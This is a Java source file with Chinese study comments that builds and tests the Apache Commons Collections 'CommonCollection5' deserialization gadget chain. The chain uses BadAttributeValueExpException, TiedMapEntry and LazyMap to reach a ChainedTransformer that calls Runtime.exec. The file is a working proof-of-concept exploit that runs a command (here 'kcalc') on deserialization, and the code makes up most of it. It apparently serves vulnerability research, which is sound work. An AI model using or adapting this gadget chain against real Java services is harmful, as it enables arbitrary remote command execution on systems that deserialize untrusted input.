package com.example.apache_collections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
import java.util.logging.MemoryHandler;

public class CommonCollection5 {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException {
        /*
        CommonCollection5 可能是被推荐的最多的一个PoC了，至少在CommonCollection1中， 就遇到过这样的问题，
        在前几篇调试，以及这个链接中  http://www.thegreycorner.com/2016/05/commoncollections-deserialization.html
        都遇到annotationHandler 报错的问题，而作者给的建议也是， 使用CommonCollection5，  本篇即调试一下此PoC

        首先看PoC中的gadget
        ```
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()

        ```

        可以看到， 这里的后几个 LazyMap， ChainedTransformer 都是在前几篇中测试过了.  先直接写出来
         */

        ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class);
        InvokerTransformer invokerTransformer = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null});
        InvokerTransformer invokerTransformer1 = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null});
//        Runtime.getRuntime().exec();
        InvokerTransformer invokerTransformer2 = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"kcalc"});
        // 加不加这个，都不行。
        ConstantTransformer constantTransformer1 = new ConstantTransformer("1");

        Transformer[] transformers = new Transformer[]{constantTransformer, invokerTransformer, invokerTransformer1, invokerTransformer2};
//        ChainedTransformer chainedTransformer = new ChainedTransformer( new Transformer[]{ new ConstantTransformer(1)});
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        chainedTransformer.transform(1);

//        Class clazz = Runtime.class;
//        Method method = clazz.getMethod("getRuntime");
//        Object object = method.invoke(Runtime.class);
//
//        Method method1 = object.getClass().getMethod("exec", String.class);
//        Object object2 = method1.invoke(object, "kcalc");


        /*
        又通过LazyMap封装，这里我们也测试过， 即decorade 可以将transform作为参数， 在调用`heapify`时会触发compare的translate方法
         */

        HashMap hashMap = new HashMap();
        Map lazyMap;
        lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        /*
        下面看一下`TiedMapEntry` 和  BadAttributeValueExpException 的关系，
        首先是`BadAttributeValueExpException`， 可以看到，其`readObject`会在取到 val的值后，判断其类型，如果在
        Long/Byte/Short等类型中，会调用toString()的方法， 如果是该类为`TiedMapEntry`时， 我们看一下它的toString()方法
        ```
        private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
            ObjectInputStream.GetField gf = ois.readFields();
            Object valObj = gf.get("val", null);

            if (valObj == null) {
                val = null;
            } else if (valObj instanceof String) {
                val= valObj;
            } else if (System.getSecurityManager() == null
                    || valObj instanceof Long
                    || valObj instanceof Integer
                    || valObj instanceof Float
                    || valObj instanceof Double
                    || valObj instanceof Byte
                    || valObj instanceof Short
                    || valObj instanceof Boolean) {
                val = valObj.toString();
            } else { // the serialized object is from a version without JDK-8019292 fix
                val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
            }
        }
        ```

        `TiedMapEntry.toString()`:
        ```java
            public String toString() {
                return getKey() + "=" + getValue();
            }

        ```
        其 `getKey/getValue`函数
        ```java
            @Override
            public K getKey() {
                return key;
            }

            @Override
            public V getValue() {
                return map.get(key);
            }
        ```
        而如果此时map对应 的`LazyMap`， 则会调用`factory.transform()`, 及整个利用过程
         */

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "foo");
//        tiedMapEntry.toString();

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        /*
        因为`BadAttributeValueExpException。val` 为 private变量，需要反射来处理
         */

        Field field = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, tiedMapEntry);

//        badAttributeValueExpException.toString();
        /*
        如果直接赋值，并不会触发， 而调用了super.get(), `!super.map.containsKey(key)`
        而`super.map.containsKey(key)` 返回了true, 并没有走到  transform这一步
        byte[] a = do_serialize(badAttributeValueExpException);
        Object b = do_unserialize(a);

        对比ysoserial 生成的poc, 确实可以执行， 那么问题出现在
         */


//        Field field1 = ChainedTransformer.class.getDeclaredField("iTransformers");
//        field1.setAccessible(true);
//        field1.set(chainedTransformer, transformers);
        byte[] a = do_serialize(badAttributeValueExpException);
        Object b = do_unserialize(a);


//        File f = new File("/home/uustay/test_5.ser");
//        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(f));
//        objectInputStream.readObject();



    }
    public static byte[]  do_serialize(Object obj) throws IOException {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();

        ObjectOutputStream oos = new ObjectOutputStream(btout);
        oos.writeObject(obj);
        System.out.println("do serialized success");
        return btout.toByteArray();
    }

    public static Object do_unserialize(byte[] data) throws IOException, ClassNotFoundException {
        ByteArrayInputStream btin = new ByteArrayInputStream(data);
        ObjectInputStream ooi = new ObjectInputStream(btin);

        System.out.println("do unserialized success");
        return ooi.readObject();
    }
}
